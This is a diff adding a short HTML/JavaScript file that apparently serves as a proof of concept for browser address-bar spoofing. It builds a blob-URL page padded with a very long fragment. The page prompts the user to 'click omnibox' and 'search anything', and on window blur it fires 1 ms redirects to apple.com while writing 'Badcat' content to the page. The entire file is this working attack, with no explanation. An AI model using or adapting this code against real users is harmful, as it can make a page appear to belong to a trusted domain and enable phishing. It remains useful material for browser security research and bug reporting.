@@ -1,0 +1,35 @@
+<script>
+const htmlContent = `
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Loading...</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 50px; background: #000; color: #0f0; }
+    h1 { font-size: 2.5em; }
+  </style>
+</head>
+<body>
+  <h1>Have Nice Day :)</h1>
+  <h1>click omnibox</h1>
+  <br>
+  <h1>search anything</h1>
+  <script>
+    window.onblur = () => {
+      setInterval(() => {
+        
+        location.href = "http://apple.com";
+        location.href="http://apple.com:88";
+        document.write('<h1>Badcat</h1><br><img src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExMmM2N2M0dDY4NTRmOTZ6NjZpaTZ5cDBuNDN6dmlqZXVtcjZ1a3ZqcSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o85xoi6nNqJQJ95Qc/giphy.gif" width="200" height="200"></img>');
+      }, 1);
+    };
+ 
+  </\script>
+</body>
+</html>
+`;
+const blob = new Blob([htmlContent], { type: 'text/html' });
+const url = URL.createObjectURL(blob);
+location=url+"#123456".repeat(1500);
+</script>
